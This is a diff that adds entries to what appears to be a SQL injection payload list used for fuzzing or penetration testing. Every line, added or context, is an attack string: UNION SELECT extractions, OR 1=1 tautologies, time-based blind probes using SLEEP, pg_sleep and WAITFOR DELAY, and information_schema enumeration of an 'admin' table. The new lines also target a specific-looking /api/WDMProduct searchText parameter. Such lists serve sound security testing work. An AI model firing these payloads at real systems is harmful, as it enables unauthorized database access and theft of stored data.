@@ -41,6 +41,10 @@
 123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
 99' OR 1=1-- -
 99' OR 5=1-- -
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D1--
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2%20OR%20(SELECT%20COUNT(*)%20FROM%20sys.tables)%3E0--
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2--
+GET /api/WDMProduct?searchText=zzz%27);WAITFOR%20DELAY%20%270:0:6%27--
 GET /r3c0n_server_4fdk59/album?hash=-4685' UNION ALL SELECT "1' UNION ALL SELECT \"1\",\"4\",\"/api/\"-- -","1","2" -- - //
 Jfjrir' union select 1,2,3,4 from admin;/*
 Jfjrir' union select 1,2,3,4;/*
@@ -48,6 +52,7 @@ Jfjrir' union select 1,2,3;/*
 Jfjrir' union select 1,2;/*
 Jfjrir' union select 1;/*
 Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG
+OR 1=1
 Payload: **2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)**
 Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
 UNION ALL SELECT NULL,NULL,( UNION ALL SELECT NULL,NULL,NULL)-- -
@@ -94,6 +99,8 @@ jdh34k' and 1=1 -- .
 myuniquename' or 1=1 --
 myuniquename' or 1=2 --
 pg_sleep(__30__)--
+searchText=zzz') OR 1=1--
+searchText=zzz');WAITFOR DELAY '0:0:6'--
 select count(*) from information_schema.columns where table_schema like "quiz" and table_name="admin" and column_name like "' + tmp_known + '%" limit 1
 select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id") and column_name like "' + tmp_known + '%" limit 1
 select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id","password") and column_name like "' + tmp_known + '%" limit 1
